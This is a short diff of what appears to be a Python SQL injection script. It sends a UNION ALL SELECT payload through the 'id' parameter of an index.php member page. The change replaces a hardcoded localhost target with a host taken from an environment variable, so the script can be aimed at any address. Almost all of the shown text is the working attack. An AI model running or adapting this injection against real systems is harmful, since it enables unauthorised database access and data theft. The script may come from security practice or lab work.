@@ -3,6 +3,7 @@
 import requests
 import urllib.parse
 import sys
+import os
 
 query = sys.argv[1]
 if len(sys.argv) == 3:
@@ -20,7 +21,8 @@ try:
 except Exception as e:
     print(e)
 
-link = "http://localhost:10080/index.php?page=member&id=1+union+all+select+1%2C"+send+"&Submit=Submit#"
+ip = os.getenv('IP')
+link = "http://" + ip + "/index.php?page=member&id=1+union+all+select+1%2C"+send+"&Submit=Submit#"
 f = requests.get(link)
 
 # print (f.text)
